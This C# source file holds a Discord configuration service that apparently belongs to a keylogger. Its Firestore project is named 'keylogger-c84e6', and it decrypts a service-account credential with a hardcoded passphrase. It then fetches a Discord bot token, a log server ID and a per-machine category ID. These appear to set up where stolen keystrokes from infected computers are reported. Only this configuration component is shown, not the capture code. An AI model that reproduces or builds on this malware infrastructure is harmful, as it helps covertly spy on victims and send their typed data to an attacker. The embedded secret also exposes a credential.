using Google.Apis.Auth.OAuth2;
using Google.Cloud.Firestore;
using Google.Cloud.Firestore.V1;
using Grpc.Auth;

public class DiscordConfigService
{
    private readonly FirestoreDb _db;

    public DiscordConfigService(string projectId = "keylogger-c84e6", string encryptedJsonPath = "SystemH.enc", string passphrase = "#P!#c-HSFJt5R2w?ET")
    {
        var credentialJson = JsonCrypto.DecryptJsonFromFileAsync(encryptedJsonPath, passphrase).GetAwaiter().GetResult();
        GoogleCredential credential = GoogleCredential.FromJson(credentialJson);
        FirestoreClientBuilder builder = new FirestoreClientBuilder
        {
            ChannelCredentials = credential.ToChannelCredentials()
        };
        FirestoreClient client = builder.Build();
        _db = FirestoreDb.Create(projectId, client);
    }

    public class DiscordConfig
    {
        public string? Token { get; set; }
        public ulong LogGuildId { get; set; }
        public ulong MachineCategoryId { get; set; }
    }

    private static bool TryGetULongFromObject(object? o, out ulong value)
    {
        value = 0;
        if (o == null) return false;
        if (o is long l) { value = (ulong)l; return true; }
        if (o is int i) { value = (ulong)i; return true; }
        if (ulong.TryParse(o.ToString(), out var r)) { value = r; return true; }
        return false;
    }

    public async Task<DiscordConfig> GetDiscordConfigAsync()
    {
        DocumentReference docRef = _db.Collection("Discord").Document("IDs | Token");
        DocumentSnapshot snapshot = await docRef.GetSnapshotAsync().ConfigureAwait(false);


        if (!snapshot.Exists)
            throw new Exception("Documento não encontrado no Firestore");


        var data = snapshot.ToDictionary();


        string token = "";
        if (data.ContainsKey("Token")) token = data["Token"]?.ToString() ?? "";
        else if (data.ContainsKey("token")) token = data["token"]?.ToString() ?? "";


        // tenta várias keys possíveis para IDs
        ulong guildId = 0;
        ulong categoryId = 0;


        object?[] possibleGuildKeys = { "_logGuildId", "LogGuildId", "logGuildId", "log_guild_id", "GuildId" };
        object?[] possibleCategoryKeys = { "_machineCategoryId", "MachineCategoryId", "machineCategoryId", "Machine_Category_Id", "CategoryId" };


        foreach (var k in possibleGuildKeys)
        {
            if (data.ContainsKey(k.ToString()) && TryGetULongFromObject(data[k.ToString()], out var v)) { guildId = v; break; }
        }


        foreach (var k in possibleCategoryKeys)
        {
            if (data.ContainsKey(k.ToString()) && TryGetULongFromObject(data[k.ToString()], out var v)) { categoryId = v; break; }
        }


        return new DiscordConfig
        {
            Token = token,
            LogGuildId = guildId,
            MachineCategoryId = categoryId
        };
    }

    public async Task<string> GetTokenAsync() => (await GetDiscordConfigAsync().ConfigureAwait(false)).Token ?? "";
    public async Task<ulong> GetLogGuildIdAsync() => (await GetDiscordConfigAsync().ConfigureAwait(false)).LogGuildId;
    public async Task<ulong> GetMachineCategoryIdAsync() => (await GetDiscordConfigAsync().ConfigureAwait(false)).MachineCategoryId;
}